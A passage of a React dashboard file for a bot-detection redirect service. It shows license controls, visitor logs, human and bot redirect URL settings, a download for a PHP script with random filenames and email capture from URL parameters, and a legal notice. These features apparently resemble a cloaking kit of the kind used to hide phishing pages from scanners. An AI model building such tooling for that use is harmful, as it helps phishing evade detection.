                        variant={isLicenseActive ? "default" : isLicensePaused ? "secondary" : "destructive"}
                        className="text-sm px-3 py-1.5"
                      >
                        {isLicenseActive && <CheckCircle2 className="h-4 w-4 mr-1.5" />}
                        {isLicensePaused && <Pause className="h-4 w-4 mr-1.5" />}
                        {isLicenseExpired && <XCircle className="h-4 w-4 mr-1.5" />}
                        {apiKeyDetails?.status?.toUpperCase() || 'UNKNOWN'}
                      </Badge>
                    </div>
                    <Separator orientation="vertical" className="h-14" />
                    <div className="flex flex-col items-center space-y-1.5">
                      <Label htmlFor="license-toggle" className="text-xs text-muted-foreground font-normal flex items-center gap-1.5">
                        {isLicensePaused ? (
                          <>
                            <Play className="h-3.5 w-3.5 text-green-600" />
                            <span>Resume</span>
                          </>
                        ) : (
                          <>
                            <Pause className="h-3.5 w-3.5 text-orange-600" />
                            <span>Pause</span>
                          </>
                        )}
                      </Label>
                      <Switch
                        id="license-toggle"
                        checked={isLicenseActive}
                        onCheckedChange={handleToggleLicense}
                        disabled={toggleLicenseMutation.isPending || isLicenseExpired}
                        data-testid="switch-license-toggle"
                        className="scale-110"
                      />
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="pt-6">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                  <div className="bg-gradient-to-br from-blue-50 to-blue-100 dark:from-blue-950 dark:to-blue-900 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-sm text-blue-700 dark:text-blue-300 font-medium">API Key Name</p>
                        <p className="text-lg font-bold text-blue-900 dark:text-blue-100 mt-1">{apiKeyDetails?.keyName || 'N/A'}</p>
                      </div>
                      <Key className="h-8 w-8 text-blue-500 opacity-50" />
                    </div>
                  </div>

                  <div className="bg-gradient-to-br from-green-50 to-green-100 dark:from-green-950 dark:to-green-900 p-4 rounded-lg border border-green-200 dark:border-green-800">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-sm text-green-700 dark:text-green-300 font-medium">API Calls Used</p>
                        <p className="text-lg font-bold text-green-900 dark:text-green-100 mt-1">
                          {apiKeyDetails?.callCount || 0} / {apiKeyDetails?.callLimit || 0}
                        </p>
                      </div>
                      <Activity className="h-8 w-8 text-green-500 opacity-50" />
                    </div>
                  </div>

                  <div className="bg-gradient-to-br from-purple-50 to-purple-100 dark:from-purple-950 dark:to-purple-900 p-4 rounded-lg border border-purple-200 dark:border-purple-800">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-sm text-purple-700 dark:text-purple-300 font-medium">Expiration</p>
                        <p className="text-lg font-bold text-purple-900 dark:text-purple-100 mt-1">
                          {apiKeyDetails?.expirationPeriod === 'unlimited' ? 'Unlimited' : apiKeyDetails?.expirationPeriod || 'N/A'}
                        </p>
                      </div>
                      <Shield className="h-8 w-8 text-purple-500 opacity-50" />
                    </div>
                  </div>
                </div>

                {(isLicensePaused || isLicenseExpired) && (
                  <div className={`${isLicenseExpired ? 'bg-red-50 dark:bg-red-950 border-red-200 dark:border-red-800' : 'bg-yellow-50 dark:bg-yellow-950 border-yellow-200 dark:border-yellow-800'} border rounded-lg p-4 flex items-start space-x-3`}>
                    <AlertTriangle className={`h-5 w-5 ${isLicenseExpired ? 'text-red-600 dark:text-red-400' : 'text-yellow-600 dark:text-yellow-400'} mt-0.5`} />
                    <div className="flex-1">
                      <p className={`font-semibold ${isLicenseExpired ? 'text-red-900 dark:text-red-100' : 'text-yellow-900 dark:text-yellow-100'}`}>
                        {isLicenseExpired ? '🔒 Service Suspended - License Expired' : '⏸️ Service Paused'}
                      </p>
                      <p className={`text-sm ${isLicenseExpired ? 'text-red-700 dark:text-red-300' : 'text-yellow-700 dark:text-yellow-300'} mt-1.5`}>
                        {isLicenseExpired ? (
                          'Your license has expired. All traffic is being redirected to the bot URL. Please contact support to renew your license.'
                        ) : (
                          <>
                            All visitors are currently being redirected to your bot URL while your license is paused. 
                            Toggle the switch above to resume normal traffic classification.
                          </>
                        )}
                      </p>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <Card className="bg-gradient-to-br from-card to-muted/20 shadow-md hover:shadow-lg transition-shadow border-2">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm font-medium text-muted-foreground flex items-center gap-2">
                    <Globe className="h-4 w-4" />
                    Total Visits
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-4xl font-extrabold text-foreground">{stats?.totalClassifications || 0}</div>
                  <p className="text-sm text-muted-foreground mt-2 flex items-center gap-1">
                    <Activity className="h-3.5 w-3.5" />
                    All time classifications
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-gradient-to-br from-green-50 to-green-100 dark:from-green-950 dark:to-green-900 shadow-md hover:shadow-lg transition-shadow border-2 border-green-200 dark:border-green-800">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm font-medium text-green-700 dark:text-green-300 flex items-center gap-2">
                    <Users className="h-4 w-4" />
                    Human Visitors
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-4xl font-extrabold text-green-900 dark:text-green-100">{stats?.humanVisitors || 0}</div>
                  <p className="text-sm text-green-700 dark:text-green-300 mt-2 flex items-center gap-1">
                    <TrendingUp className="h-3.5 w-3.5" />
                    {stats?.totalClassifications ? Math.round((stats.humanVisitors / stats.totalClassifications) * 100) : 0}% of total traffic
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-gradient-to-br from-red-50 to-red-100 dark:from-red-950 dark:to-red-900 shadow-md hover:shadow-lg transition-shadow border-2 border-red-200 dark:border-red-800">
                <CardHeader className="pb-3">
                  <CardTitle className="text-sm font-medium text-red-700 dark:text-red-300 flex items-center gap-2">
                    <Bot className="h-4 w-4" />
                    Bot Traffic
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="text-4xl font-extrabold text-red-900 dark:text-red-100">{stats?.botTraffic || 0}</div>
                  <p className="text-sm text-red-700 dark:text-red-300 mt-2 flex items-center gap-1">
                    <Shield className="h-3.5 w-3.5" />
                    {stats?.totalClassifications ? Math.round((stats.botTraffic / stats.totalClassifications) * 100) : 0}% blocked
                  </p>
                </CardContent>
              </Card>
            </div>

            <Card className="shadow-md border-2">
              <CardHeader className="bg-gradient-to-r from-primary/5 to-primary/0">
                <CardTitle className="flex items-center gap-2">
                  <TrendingUp className="h-5 w-5 text-primary" />
                  Recent Activity
                </CardTitle>
                <CardDescription>Latest visitor classifications in real-time</CardDescription>
              </CardHeader>
              <CardContent>
                {classifications.length === 0 ? (
                  <div className="text-center py-12 text-muted-foreground">
                    <Activity className="h-12 w-12 mx-auto mb-3 opacity-30" />
                    <p className="font-medium">No visitors yet</p>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {classifications.slice(0, 5).map((c: any, i: number) => (
                      <div key={i} className="flex items-center justify-between p-3 bg-muted/30 hover:bg-muted/50 rounded-lg transition-colors border border-transparent hover:border-primary/20">
                        <div className="flex items-center space-x-3">
                          {c.visitorType === 'Human' ? (
                            <div className="bg-gradient-to-br from-green-100 to-green-200 dark:from-green-900 dark:to-green-800 p-2.5 rounded-full shadow-sm">
                              <Users className="h-4 w-4 text-green-700 dark:text-green-300" />
                            </div>
                          ) : (
                            <div className="bg-gradient-to-br from-red-100 to-red-200 dark:from-red-900 dark:to-red-800 p-2.5 rounded-full shadow-sm">
                              <Bot className="h-4 w-4 text-red-700 dark:text-red-300" />
                            </div>
                          )}
                          <div>
                            <p className="font-semibold text-sm">{c.visitorType}</p>
                            <p className="text-xs text-muted-foreground">{c.isp || 'Unknown ISP'}</p>
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="text-sm font-mono font-semibold">{format(new Date(c.timestamp), 'HH:mm:ss')}</p>
                          <p className="text-xs text-muted-foreground">
                            {c.city && c.countryCode 
                              ? `${c.city}${c.region ? ', ' + c.region : ''}, ${c.countryCode}`
                              : (c.country || 'Unknown')}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="live" className="space-y-6">
            <LiveEventsFeed />
          </TabsContent>

          <TabsContent value="domains" className="space-y-6">
            <DomainBrowserSection />
          </TabsContent>

          <TabsContent value="logs" className="space-y-6">
            <Card className="shadow-md">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <FileText className="h-5 w-5 text-primary" />
                  Visitor Classification History
                </CardTitle>
                <CardDescription>Detailed log of all visitor classifications</CardDescription>
              </CardHeader>
              <CardContent>
                {classifications.length === 0 ? (
                  <div className="text-center py-12 text-muted-foreground">
                    <FileText className="h-12 w-12 mx-auto mb-3 opacity-30" />
                    <p>No classification data available.</p>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Time</TableHead>
                          <TableHead>Classification</TableHead>
                          <TableHead>Country</TableHead>
                          <TableHead>ISP</TableHead>
                          <TableHead>Device</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {classifications.map((c: any, i: number) => (
                          <TableRow key={i} data-testid={`row-classification-${i}`}>
                            <TableCell className="font-mono text-sm">
                              {format(new Date(c.timestamp), 'MM/dd HH:mm:ss')}
                            </TableCell>
                            <TableCell>
                              {c.visitorType === 'Human' ? (
                                <Badge className="bg-green-600 text-white gap-1">
                                  <Users className="h-3 w-3" />
                                  Human
                                </Badge>
                              ) : (
                                <Badge className="bg-red-600 text-white gap-1">
                                  <Bot className="h-3 w-3" />
                                  Bot
                                </Badge>
                              )}
                            </TableCell>
                            <TableCell className="text-sm">
                              {c.city && c.countryCode 
                                ? `${c.city}${c.region ? ', ' + c.region : ''}, ${c.countryCode}`
                                : (c.country || 'Unknown')}
                            </TableCell>
                            <TableCell className="text-sm">{c.isp || '-'}</TableCell>
                            <TableCell className="text-sm">{c.deviceType || '-'}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="settings" className="space-y-6">
            <Card className="shadow-md">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <LinkIcon className="h-5 w-5 text-primary" />
                  Redirect URLs
                </CardTitle>
                <CardDescription>Configure where visitors are sent after classification</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="human-url">Human Redirect URL</Label>
                  <div className="flex gap-2">
                    <Input
                      id="human-url"
                      type="url"
                      value={humanUrl}
                      onChange={(e) => setHumanUrl(e.target.value)}
                      placeholder="https://example.com/welcome"
                      data-testid="input-human-url"
                    />
                  </div>
                  <p className="text-sm text-muted-foreground">Where human visitors will be redirected</p>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="bot-url">Bot Redirect URL</Label>
                  <div className="flex gap-2">
                    <Input
                      id="bot-url"
                      type="url"
                      value={botUrl}
                      onChange={(e) => setBotUrl(e.target.value)}
                      placeholder="https://google.com"
                      data-testid="input-bot-url"
                    />
                  </div>
                  <p className="text-sm text-muted-foreground">Where bot traffic will be redirected</p>
                </div>

                <Button 
                  onClick={handleSaveUrls}
                  disabled={updateUrlsMutation.isPending}
                  data-testid="button-save-urls"
                  className="gap-2"
                >
                  <Save className="h-4 w-4" />
                  {updateUrlsMutation.isPending ? "Saving..." : "Save URLs"}
                </Button>
              </CardContent>
            </Card>

            <Card className="shadow-md">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Code className="h-5 w-5 text-primary" />
                  PHP Script Download
                </CardTitle>
                <CardDescription>Get your customized PHP protection script</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="bg-muted rounded-lg p-4 space-y-2">
                  <p className="text-sm font-medium">How it works:</p>
                  <ul className="text-sm text-muted-foreground space-y-1 list-disc list-inside">
                    <li>Download the PHP script package (random filename for security)</li>
                    <li>Extract and upload index.php to your website</li>
                    <li>10-minute session cache reduces API costs (repeat visitors redirected silently)</li>
                    <li>Enhanced bot detection: headless browsers, known crawlers, suspicious patterns</li>
                    <li>Email capture from URLs (?e= or ?email=), browser detection, security headers</li>
                    <li>Humans go to: {redirectUrls?.humanUrl || "Default: https://example.com/human"}</li>
                    <li>Bots go to: {redirectUrls?.botUrl || "Default: https://google.com"}</li>
                  </ul>
                </div>

                <div className="flex gap-2">
                  <Button
                    onClick={handleDownloadScript}
                    className="gap-2"
                    data-testid="button-download-script"
                  >
                    <Download className="h-4 w-4" />
                    Download Script (ZIP)
                  </Button>
                </div>
              </CardContent>
            </Card>

            <Card className="shadow-md">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <User className="h-5 w-5 text-primary" />
                  Account Settings
                </CardTitle>
                <CardDescription>Manage your account security</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label>Username</Label>
                  <Input value={user?.username || ''} disabled />
                </div>

                <Dialog open={isPasswordDialogOpen} onOpenChange={setIsPasswordDialogOpen}>
                  <DialogTrigger asChild>
                    <Button variant="outline" className="gap-2" data-testid="button-change-password">
                      <Lock className="h-4 w-4" />
                      Change Password
                    </Button>
                  </DialogTrigger>
                  <DialogContent>
                    <DialogHeader>
                      <DialogTitle>Change Password</DialogTitle>
                      <DialogDescription>
                        Enter your current password and choose a new one (min. 8 characters)
                      </DialogDescription>
                    </DialogHeader>
                    <div className="space-y-4 py-4">
                      <div className="space-y-2">
                        <Label htmlFor="current-password">Current Password</Label>
                        <Input
                          id="current-password"
                          type="password"
                          value={currentPassword}
                          onChange={(e) => setCurrentPassword(e.target.value)}
                          data-testid="input-current-password"
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="new-password">New Password</Label>
                        <Input
                          id="new-password"
                          type="password"
                          value={newPassword}
                          onChange={(e) => setNewPassword(e.target.value)}
                          data-testid="input-new-password"
                        />
                      </div>
                      <div className="space-y-2">
                        <Label htmlFor="confirm-password">Confirm New Password</Label>
                        <Input
                          id="confirm-password"
                          type="password"
                          value={confirmPassword}
                          onChange={(e) => setConfirmPassword(e.target.value)}
                          data-testid="input-confirm-password"
                        />
                      </div>
                    </div>
                    <DialogFooter>
                      <Button
                        onClick={handleChangePassword}
                        disabled={changePasswordMutation.isPending}
                        data-testid="button-confirm-password-change"
                      >
                        {changePasswordMutation.isPending ? "Changing..." : "Change Password"}
                      </Button>
                    </DialogFooter>
                  </DialogContent>
                </Dialog>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="legal" className="space-y-6">
            <Card className="bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-blue-950 dark:to-indigo-950 shadow-md border-2 border-blue-200 dark:border-blue-800">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-blue-900 dark:text-blue-100">
                  <Shield className="h-5 w-5" />
                  Important Legal & Privacy Notice
                </CardTitle>
                <CardDescription>
                  Please read carefully - Your responsibilities and our privacy commitments
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="bg-white/80 dark:bg-black/20 p-4 rounded-lg border border-blue-200 dark:border-blue-700">
                  <h3 className="font-semibold text-blue-900 dark:text-blue-100 mb-2 flex items-center gap-2">
                    <AlertTriangle className="h-4 w-4 text-orange-600" />
                    User Liability & Responsibility
                  </h3>
                  <p className="text-sm text-blue-800 dark:text-blue-200">
                    You are solely responsible for how you use this service and any consequences arising from its use. 
                    By using this service, you agree to comply with all applicable laws and regulations, including but not limited to 
                    privacy laws (GDPR, CCPA), anti-discrimination laws, and search engine guidelines. You are liable for ensuring 
                    your implementation is lawful and ethical.
                  </p>
                </div>

                <div className="bg-white/80 dark:bg-black/20 p-4 rounded-lg border border-green-200 dark:border-green-700">
                  <h3 className="font-semibold text-green-900 dark:text-green-100 mb-2 flex items-center gap-2">
                    <Lock className="h-4 w-4 text-green-600" />
                    Privacy Protection
                  </h3>
                  <p className="text-sm text-green-800 dark:text-green-200 mb-2">
                    <strong>We prioritize visitor privacy:</strong>
                  </p>
                  <ul className="text-sm text-green-800 dark:text-green-200 list-disc list-inside space-y-1 ml-2">
                    <li><strong>No Email Storage:</strong> Email capture works for redirect logic but is never stored in our database</li>
                    <li><strong>No IP Address Display:</strong> Your dashboard shows Country, ISP, and Device only - no visitor IP addresses</li>
                    <li><strong>Last 50 Records Only:</strong> We automatically delete older classification records to minimize data retention</li>
                    <li><strong>No Personal Tracking:</strong> We do not store any personally identifiable information about your visitors</li>
                  </ul>
                </div>

                <div className="bg-white/80 dark:bg-black/20 p-4 rounded-lg border border-purple-200 dark:border-purple-700">
                  <h3 className="font-semibold text-purple-900 dark:text-purple-100 mb-2 flex items-center gap-2">
                    <Shield className="h-4 w-4 text-purple-600" />
                    Service Purpose: Security Only
                  </h3>
                  <p className="text-sm text-purple-800 dark:text-purple-200">
                    <strong>This service is designed exclusively for legitimate security and bot prevention purposes.</strong> 
                    It analyzes visitor IP addresses to detect datacenter traffic, VPNs, proxies, and automated bots, 
                    then redirects visitors accordingly. This service should NOT be used for cloaking (showing different content 
                    to search engines), fraudulent activities, discrimination, or any illegal purposes. Use responsibly.
                  </p>
                </div>

                <div className="bg-orange-50 dark:bg-orange-950 border border-orange-200 dark:border-orange-800 rounded-lg p-3">
                  <p className="text-xs text-orange-800 dark:text-orange-200 flex items-center gap-2">
                    <AlertTriangle className="h-3.5 w-3.5" />
                    <span>
                      <strong>Disclaimer:</strong> This service provides tools only. You are responsible for compliance with all applicable laws in your jurisdiction.
                    </span>
                  </p>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
